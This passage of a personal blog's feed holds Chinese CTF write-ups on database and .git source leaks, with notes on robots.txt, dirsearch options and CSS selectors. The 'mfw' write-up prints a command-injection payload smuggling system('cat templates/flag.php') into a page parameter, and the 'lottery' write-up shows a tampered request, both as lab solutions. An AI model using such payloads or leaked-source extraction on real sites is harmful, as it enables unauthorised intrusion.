src="https://s2.loli.net/2022/05/25/vgBhPyA7Hx8Nr3e.png"></li><li>传参后获得flag</li></ol><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><ol><li>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</li><li>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</li><li>没有什么是文本编辑器看不了的<br><a href="https://imgtu.com/i/XFNTO0"><img src="https://s1.ax1x.com/2022/05/25/XFNTO0.png" alt="XFNTO0.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git源码泄露问题</title>
      <link href="/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="git源码泄露问题"><a href="#git源码泄露问题" class="headerlink" title="git源码泄露问题"></a>git源码泄露问题</h1><h2 id="githack是什么"><a href="#githack是什么" class="headerlink" title="githack是什么"></a>githack是什么</h2><ol><li>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</li></ol><h2 id="Git-源码泄露"><a href="#Git-源码泄露" class="headerlink" title="Git 源码泄露"></a>Git 源码泄露</h2><p>开发人员会使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以利用这个漏洞直接获得网页源码。</p><h2 id="确定是否存在泄漏"><a href="#确定是否存在泄漏" class="headerlink" title="确定是否存在泄漏"></a>确定是否存在泄漏</h2><p>想要确定是否存在这个漏洞，可以通过以下方式。首先是看看有没有提示醒目地指出 Git，如果有就考虑存在。如果没有也可以使用 dirsearch 工具扫描后台，如果存在则会扫描出 .git 目录如图所示。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li>githack只能在python2环境下运行，否则会出现<br><img src="https://s2.loli.net/2022/05/17/ufNapbJdWSlRhHE.png"></li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="攻防世界lottery"><a href="#攻防世界lottery" class="headerlink" title="攻防世界lottery"></a>攻防世界lottery</h3><ol><li><p>打开网页，让我们买彩票赚钱，随便买一下<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902101030311-594723942.png"><br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902102734433-334503714.png"></p></li><li><p>赚够足够的钱，才能够买flag<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902103927411-413792927.png"></p></li><li><p>用dirsearch扫一下后台,发现有git<br><img src="https://s2.loli.net/2022/05/17/uKqnltzHT9wRcUJ.png"></p></li><li><p>或者用御剑扫以下后台，发现robot协议文件，发现禁用git，很可疑，判断是git源码泄露</p></li><li><p>用githack扫描url，把文件都下载下来</p><pre class="line-numbers language-none"><code class="language-none">python githack.py URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>打开其中的 “api.php” 文件审计代码，注意到这里有个 buy() 函数，这个是我们在网页买彩票会调用的函数。其中我们看到 numbers 这个变量是我们能操作的，函数会以数组的形式提取每位数字。</p></li></ol><p><img src="https://s2.loli.net/2022/05/17/G8wMKyUBuP3Abgp.png"></p><ol start="7"><li><p>由于随机变量是数字，因此我们可以使用 true 来满足比较，但是我们显然不能在输入框输入 7 个 “true”。因此我们考虑修改数据包，通过抓包发现数据的传输是通过传一个映射来上传的。<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902103450123-831589597.jpg"></p></li><li><p>因此抓包之后修改 numbers 变量为一个数组，其中的 7 个变量都是 true。放包之后就能够快速赚钱了，赚够钱后购买得到 flag</p></li></ol><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="攻防世界mfw"><a href="#攻防世界mfw" class="headerlink" title="攻防世界mfw"></a>攻防世界mfw</h3><ol><li>打开后在每个标签中查看<br><img src="https://s2.loli.net/2022/05/18/hG7ucDX1SlxnLR8.png"></li><li>查看源代码发现有个跳转到flag的超链接被注释掉了，但是不允许修改，我直接改跳转到contact的超链接为flag<br><img src="https://s2.loli.net/2022/05/18/rFoVfdMxc4JqHDz.png"></li><li>但是在flag标签内什么也没有发现<br><img src="https://s2.loli.net/2022/05/18/yCV58D71mQvMdYt.png"></li><li>在上一张图片中有两个词，git和php，猜测是git源码泄露，用dirsearch跑一跑,真的发现了很多.git文件</li></ol><p><img src="https://s2.loli.net/2022/05/18/GVN56mYsDi31W4S.png"></p><ol start="5"><li><p>用githack去跑，看看能不能下下来一些.git下的源码，发现在.index的开头找到了php源码<br><img src="https://s2.loli.net/2022/05/18/9mv3rVzMhtELTjU.png"></p></li><li><p>其中assert()函数会将括号中的字符当成代码来执行，并返回true或false，strpos()函数会返回字符串第一次出现的位置，如果没有找到则返回False</p></li><li><p>于是重心就放在file变量中，发现file变量是用我们输入的page变量拼接而成的，而且没有任何的过滤，我们可以在这段输入的字符中插入system函数来执行系统命令<br><img src="https://s2.loli.net/2022/05/18/kfJjFVSPbWrpsHc.png"></p></li><li><p>注意到调用file时用的单引号和括号来限制file的范围<br>于是可以构造url为</p><pre class="line-numbers language-none"><code class="language-none">page&#x3D;a &#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/18/jG4twcHOWvbkFCq.png"></p></li></ol><h2 id="ctfshow-web7"><a href="#ctfshow-web7" class="headerlink" title="ctfshow.web7"></a>ctfshow.web7</h2><ol><li>考察git代码泄露，直接访问url/.git/index.php</li><li>git源码泄露一般在根目录下/.git/文件夹下找<br><img src="https://s2.loli.net/2022/05/18/TIRAXNm3fVMi1l7.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots协议</title>
      <link href="/robots%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/"/>
      <url>/robots%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h1><h2 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h2><ol><li>robots.txt是存放在站点根目录下的一个纯文本文件。</li></ol><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><ol><li>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</li></ol><h2 id="作用的描述："><a href="#作用的描述：" class="headerlink" title="作用的描述："></a>作用的描述：</h2><ol><li>Robots协议也称为爬虫协议、爬虫规则、机器人协议，是网站国际互联网界通行的道德规范,其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯。“规则”中将搜索引擎抓取网站内容的范围做了约定,包括网站是否希望被搜索引擎抓取,哪些内容不允许被抓取,而网络爬虫可以据此自动抓取或者不抓取该网页内容。</li><li>如果将网站视为酒店里的一个房间,robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观,哪些不对搜索引擎开放。</li></ol><h2 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h2><ol><li><p>robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又稱元資料）。</p></li><li><p>robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。注意robots.txt是用字符串比较来确定是否获取URL，所以目录末尾有与没有斜杠“/”表示的是不同的URL。robots.txt允许使用类似”Disallow: *.gif”这样的通配符[1][2]。</p></li><li><p>其他的影响搜索引擎的行为的方法包括使用robots元数据：</p><pre class="line-numbers language-none"><code class="language-none">&lt;meta name&#x3D;&#39;robot&#39; content&#x3D;&quot;noindex,nofollow&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="robot协议详解"><a href="#robot协议详解" class="headerlink" title="robot协议详解"></a>robot协议详解</h1><ol><li>Robots协议是Web站点和搜索引擎爬虫交互的一种方式，Robots.txt是存放在站点根目录下的一个纯文本文件。该文件可以指定搜索引擎爬虫只抓取指定的内容，或者是禁止搜索引擎爬虫抓取网站的部分或全部内容。当一个搜索引擎爬虫访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索引擎爬虫就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索引擎爬虫就沿着链接抓取。</li></ol><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><pre class="line-numbers language-none"><code class="language-none">允许所有的机器人：User-agent: *Disallow:另一写法User-agent: *Allow:&#x2F;仅允许特定的机器人：（name_spider用真实名字代替）User-agent: name_spiderAllow:拦截所有的机器人：User-agent: *Disallow: &#x2F;禁止所有机器人访问特定目录：User-agent: *Disallow: &#x2F;cgi-bin&#x2F;Disallow: &#x2F;images&#x2F;Disallow: &#x2F;tmp&#x2F;Disallow: &#x2F;private&#x2F;仅禁止坏爬虫访问特定目录（BadBot用真实的名字代替）：User-agent: BadBotDisallow: &#x2F;private&#x2F;禁止所有机器人访问特定文件类型[2]：User-agent: *Disallow: &#x2F;*.php$Disallow: &#x2F;*.js$Disallow: &#x2F;*.inc$Disallow: &#x2F;*.css$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch使用方法</title>
      <link href="/dirsearch/"/>
      <url>/dirsearch/</url>
      
        <content type="html"><![CDATA[<h1 id="dirsearch使用方法"><a href="#dirsearch使用方法" class="headerlink" title="dirsearch使用方法"></a>dirsearch使用方法</h1><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><ol><li><p>dirsearch 是一款使用 python3 编写的，用于暴力破解目录的工具，其 README 有写到下面一点</p></li><li><p>Heuristically detects invalid web pages（启发式地检测无效 web 页面）</p></li></ol><h2 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h2><pre class="line-numbers language-none"><code class="language-none">最基本：python dirsearch.py -u URL后面选项:  -h, --help            显示此帮助消息并退出  Mandatory:    -u URL, --url&#x3D;URL   URL目标        -L URLLIST, --url-list&#x3D;URLLIST                        URL列表目标                            -e EXTENSIONS, --extensions&#x3D;EXTENSIONS                        以逗号分隔的扩展列表（示例：php、asp）                            -E, --extensions-list                        使用公共扩展的预定义列表  Dictionary Settings:    -w WORDLIST, --wordlist&#x3D;WORDLIST                        自定义单词表（用逗号分隔）    -l, --lowercase    -f, --force-extensions                        强制扩展每个单词表条目（如DirBuster）  常规设置:    -s DELAY, --delay&#x3D;DELAY                        请求之间的延迟（浮点数）                            -r, --recursive     递归暴力        -R RECURSIVE_LEVEL_MAX, --recursive-level-max&#x3D;RECURSIVE_LEVEL_MAX                        最大递归级别（子目录）（默认值：1[仅限根目录+1目录]）                            --suppress-empty, --suppress-empty    --scan-subdir&#x3D;SCANSUBDIRS, --scan-subdirs&#x3D;SCANSUBDIRS                        扫描给定-u |--url的子目录（分开逗号）                            --exclude-subdir&#x3D;EXCLUDESUBDIRS, --exclude-subdirs&#x3D;EXCLUDESUBDIRS                        在递归过程中排除下列子目录扫描（用逗号分隔）                            -t THREADSCOUNT, --threads&#x3D;THREADSCOUNT                        线程数                            -x EXCLUDESTATUSCODES, --exclude-status&#x3D;EXCLUDESTATUSCODES                        排除状态代码，用逗号分隔（例如：301，500个）                            --exclude-texts&#x3D;EXCLUDETEXTS                        用逗号分隔的文本排除响应(示例: &quot;Not found&quot;, &quot;Error&quot;)                            --exclude-regexps&#x3D;EXCLUDEREGEXPS                        按regexp排除响应，用逗号分隔(示例： &quot;Not foun[a-z]&#123;1&#125;&quot;, &quot;^Error$&quot;)                            -c COOKIE, --cookie&#x3D;COOKIE        --ua&#x3D;USERAGENT, --user-agent&#x3D;USERAGENT    用户代理       -F, --follow-redirects     --遵循重定向        -H HEADERS, --header&#x3D;HEADERS 页眉，--页眉&#x3D;页眉                        要添加的标题 (example: --header &quot;Referer:                        example.com&quot; --header &quot;User-Agent: IE&quot;                            --random-agents, --random-user-agents     随机代理，--随机用户代理  连接设置:    --timeout&#x3D;TIMEOUT   连接超时        --ip&#x3D;IP             将名称解析为IP地址        --proxy&#x3D;HTTPPROXY, --http-proxy&#x3D;HTTPPROXY                        Http代理 (example: localhost:8080                            --http-method&#x3D;HTTPMETHOD                        要使用的方法，默认值：GET，也可能是：HEAD；POST                            --max-retries&#x3D;MAXRETRIES    最大重试次数        -b, --request-by-hostname                        默认情况下，dirsearch将通过IP请求速度。这将强制按主机名请求 报告:    --simple-report&#x3D;SIMPLEOUTPUTFILE 简单输出文件                        只找到路径                            --plain-text-report&#x3D;PLAINTEXTOUTPUTFILE 纯文本输出文件                        找到带有状态代码的路径                            --json-report&#x3D;JSONOUTPUTFILE JSON输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/17/uKqnltzHT9wRcUJ.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="/CSS/"/>
      <url>/CSS/</url>
      
        <content type="html"><![CDATA[<h1 id="网页分为"><a href="#网页分为" class="headerlink" title="网页分为"></a>网页分为</h1><ol><li>结构:HTML</li><li>表现:CSS</li><li>行为:JS</li></ol><h1 id="CSS-层叠样式表"><a href="#CSS-层叠样式表" class="headerlink" title="CSS 层叠样式表"></a>CSS 层叠样式表</h1><ol><li>层叠：网页是一个立体的结构，只是看起来像是一个平面，其实有一定的层次结构</li><li>我们看到的只是最上面的一层</li><li>通过CSS可以为网页的每一个层设置样式</li><li>总之：CSS可以用来设置网页中元素的样式</li></ol><h1 id="使用CSS来修改元素的样式"><a href="#使用CSS来修改元素的样式" class="headerlink" title="使用CSS来修改元素的样式"></a>使用CSS来修改元素的样式</h1><h2 id="第一种方式：内联样式（不推荐使用）"><a href="#第一种方式：内联样式（不推荐使用）" class="headerlink" title="第一种方式：内联样式（不推荐使用）"></a>第一种方式：内联样式（不推荐使用）</h2><ol><li>在标签内部通过style属性来设置元素的样式</li><li>只能在开始标签中设置,style的值即为css</li><li>名字和值之间使用冒号连接</li><li>每一个名值对以分号结尾<pre class="line-numbers language-none"><code class="language-none">&lt;p style&#x3D;&quot;color:red; font-size:20px&quot;&gt;&lt;&#x2F;p&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不推荐使用内联样式"><a href="#不推荐使用内联样式" class="headerlink" title="不推荐使用内联样式"></a>不推荐使用内联样式</h3></li><li>使用内联样式，只能对一个标签生效</li><li>如果希望影响到多个元素，必须在每一个元素中都复制一遍</li><li>后期维护的时候，如果前期复制一百遍，后期就要改一百遍，维护起来非常不方便</li></ol><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><pre class="line-numbers language-none"><code class="language-none">p&#123;color:green;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>标签名+{属性}</li></ol><h3 id="开发时一定一定不要使用内联样式"><a href="#开发时一定一定不要使用内联样式" class="headerlink" title="开发时一定一定不要使用内联样式"></a>开发时一定一定不要使用内联样式</h3><h2 id="第二种方式：内部样式表"><a href="#第二种方式：内部样式表" class="headerlink" title="第二种方式：内部样式表"></a>第二种方式：内部样式表</h2><ol><li>将样式编写到head中的style标签中</li><li>然后通过CSS的选择器来选中元素，并为其设置各种样式</li><li>可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用</li><li>内部样式表更方便对样式进行重复使用</li><li>内部样式表只能对一个页面起作用，里面的样式不能跨页面进行复用</li></ol><h2 id="第三种方式：外部样式表（最佳使用方式）"><a href="#第三种方式：外部样式表（最佳使用方式）" class="headerlink" title="第三种方式：外部样式表（最佳使用方式）"></a>第三种方式：外部样式表（最佳使用方式）</h2><h3 id="可以将CSS样式编写到一个外部的CSS文件中"><a href="#可以将CSS样式编写到一个外部的CSS文件中" class="headerlink" title="可以将CSS样式编写到一个外部的CSS文件中"></a>可以将CSS样式编写到一个外部的CSS文件中</h3><h3 id="然后通过link标签引入外部的CSS文件"><a href="#然后通过link标签引入外部的CSS文件" class="headerlink" title="然后通过link标签引入外部的CSS文件"></a>然后通过link标签引入外部的CSS文件</h3><pre class="line-numbers language-none"><code class="language-none">p&#123;    color: tomato;    font-size: 100px;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lt-link-gt"><a href="#lt-link-gt" class="headerlink" title="&lt; link&gt;"></a>&lt; link&gt;</h3><ol><li>通过link标签来引入外部的CSS文件</li><li>外部样式表需要通过link标签进行引入，意味着只要想使用这些样式的网页可以对其进行引用</li></ol><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><ol><li>使样式可以在不同页面进行复用，提高复用率</li><li>将样式编写到外部的CSS文件中，可以使用浏览器的缓存机制，从而加快网页的加载速度，提高用户的体验</li></ol><h1 id="CSS语法"><a href="#CSS语法" class="headerlink" title="CSS语法"></a>CSS语法</h1><h2 id="和HTML不同"><a href="#和HTML不同" class="headerlink" title="和HTML不同"></a>和HTML不同</h2><ol><li>CSS语法和HTML的语法互相隔离</li></ol><h2 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h2><ol><li>和c++中的多行注释相同<pre class="line-numbers language-none"><code class="language-none">&#x2F;*abc*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><pre class="line-numbers language-none"><code class="language-none">p&#123;    color: red;    font-size: 20px;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><ol><li>通过选择器可以选中页面中的指定元素</li><li>选择器选中的是html中的标签</li></ol><h3 id="声明块"><a href="#声明块" class="headerlink" title="声明块"></a>声明块</h3><ol><li>通过声明块来指定要为元素设置的样式</li><li>声明块由一个个的声明组成</li><li>声明是由一个个的名值对组成</li></ol><h4 id="名值对"><a href="#名值对" class="headerlink" title="名值对"></a>名值对</h4><ol><li>一个样式名对应一个样式值，名和值之间以’:’连接，以’;’结尾</li><li>样式名值对之间的分号不能省略，最后一个名值对后面的分号可以省略（我联想到了sql语句select选中列的语法相同）</li></ol><h1 id="选择器-1"><a href="#选择器-1" class="headerlink" title="选择器"></a>选择器</h1><h2 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h2><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol><li>根据标签来选中指定的元素<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2></li><li>标签名{}<pre class="line-numbers language-none"><code class="language-none">p&#123;&#125; h1&#123;&#125; div&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/qQw72DNRAcvPsYL.png"></li></ol><h2 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol><li>根据元素的id属性值选中一个元素</li></ol><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">#id属性值&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/15/wxAhokB8HdZtTiN.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>id值只有一个，不能重复使用</li></ol><p><img src="https://s2.loli.net/2022/05/15/qQWEGuYVzd4nm7s.png"></p><h2 id="class选择器（类）"><a href="#class选择器（类）" class="headerlink" title="class选择器（类）"></a>class选择器（类）</h2><ol><li>class是一个标签的属性，和id类似，不同的是，class可以重复使用</li><li>可以通过class属性来为元素分组</li><li>可以同时为一个元素指定多个class属性</li><li>标签中的多个class属性通过空格隔开&amp;/nbsp;<br><img src="https://s2.loli.net/2022/05/16/NHKhdM9qXUuWJwF.png"></li></ol><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">.class(属性值)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/16/gjH1zo382Q7uGFy.png"></p><h2 id="通配选择器"><a href="#通配选择器" class="headerlink" title="通配选择器"></a>通配选择器</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><ol><li>选中页面中的所有元素<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">*&#123;属性值&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/5j74LVzBTZpN9He.png"></li></ol><h1 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h1><h2 id="交叉选择器"><a href="#交叉选择器" class="headerlink" title="交叉选择器"></a>交叉选择器</h2><ol><li>选中同时满足多个条件的元素</li><li>多个选择器的复合<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3></li><li>选择器1.选择器2.选择器n{}<pre class="line-numbers language-none"><code class="language-none">div.red&#123;    font-size: 30px;    color: red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ol><li>交叉选择器中如果有元素选择器，必须使用元素选择器开头</li><li>一般不会出现id选择器和其它选择器的复用，因为id选择器已经可以唯一确定一个标签，一般只是元素选择器和类选择器之间的交叉</li></ol><h2 id="选择器分组-并集选择器"><a href="#选择器分组-并集选择器" class="headerlink" title="选择器分组/并集选择器"></a>选择器分组/并集选择器</h2><h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h3><ol><li>同时选择多个选择器对应的元素</li></ol><h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">选择器1,选择器2,选择器n&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>逗号在此处相当于是并集符号<br><img src="https://s2.loli.net/2022/05/16/tF5kXKfyqu1zaoM.png"></li></ol><h2 id="交叉选择器和并集选择器可以复合使用"><a href="#交叉选择器和并集选择器可以复合使用" class="headerlink" title="交叉选择器和并集选择器可以复合使用"></a>交叉选择器和并集选择器可以复合使用</h2><h2 id="网页中不同元素之间的关系"><a href="#网页中不同元素之间的关系" class="headerlink" title="网页中不同元素之间的关系"></a>网页中不同元素之间的关系</h2><h3 id="父子关系"><a href="#父子关系" class="headerlink" title="父子关系"></a>父子关系</h3><ol><li>直接包含子元素的是父元素（注意是直接）</li><li>直接被父元素包含的是子元素<h3 id="祖先后代元素"><a href="#祖先后代元素" class="headerlink" title="祖先后代元素"></a>祖先后代元素</h3></li><li>直接或间接包含后代元素叫祖先元素</li><li>一个元素的父元素也是祖先元素</li><li>直接或间接被祖先元素包含的元素叫做后代元素</li></ol><h3 id="兄弟元素"><a href="#兄弟元素" class="headerlink" title="兄弟元素"></a>兄弟元素</h3><ol><li>拥有相同父元素的叫兄弟元素</li></ol><h2 id="关系选择器"><a href="#关系选择器" class="headerlink" title="关系选择器"></a>关系选择器</h2><h3 id="子元素选择器"><a href="#子元素选择器" class="headerlink" title="子元素选择器"></a>子元素选择器</h3><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><ol><li>选中指定父元素的指定子元素<h4 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-none"><code class="language-none">父元素 &gt; 子元素div &gt; span &#123;    color: red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="后代元素选择器"><a href="#后代元素选择器" class="headerlink" title="后代元素选择器"></a>后代元素选择器</h3><h4 id="作用：-2"><a href="#作用：-2" class="headerlink" title="作用："></a>作用：</h4><ol><li>选中指定元素的指定后代元素</li><li>范围比子选择器更大，相当于递归处理（-r）</li></ol><h4 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-none"><code class="language-none">祖先 后代&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="兄弟元素选择器"><a href="#兄弟元素选择器" class="headerlink" title="兄弟元素选择器"></a>兄弟元素选择器</h2><h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h3><ol><li>选择下一个兄弟</li><li>注意必须是紧邻的下一个兄弟元素</li><li>隔开的兄弟元素不会被选中</li><li>前面的兄弟元素不会被选中，只会选中前面的兄弟元素</li></ol><h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">前一个 + 下一个 p + span&#123; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">选择下边所有的兄弟兄 ~ 弟&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><h3 id="title可以指定标签的标题"><a href="#title可以指定标签的标题" class="headerlink" title="title可以指定标签的标题"></a>title可以指定标签的标题</h3><ol><li>写的是什么，鼠标光标移到某个位置，可以显示提示文字</li></ol><h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">元素选择器[属性]&#123;    属性&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/16/f4yUhwZo2QePTOi.png"><br><img src="https://s2.loli.net/2022/05/16/ZeJnYEp79XFv1qD.png"><br><img src="https://s2.loli.net/2022/05/16/DrRizNOxHB8jMqW.png"></p><h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h3><ol><li>选择含有指定属性的元素</li></ol><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><pre class="line-numbers language-none"><code class="language-none">[属性名] 选择含有指定属性的元素[属性名&#x3D;属性值] 选择含有指定元素属性和属性值的元素[属性名^&#x3D;属性值] 选择属性值以指定值开头的元素[属性名$&#x3D;属性值] 选择属性值以指定值结尾的元素[属性名*&#x3D;属性值] 选择属性值中含有某值的元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dfs</title>
      <link href="/bfs/"/>
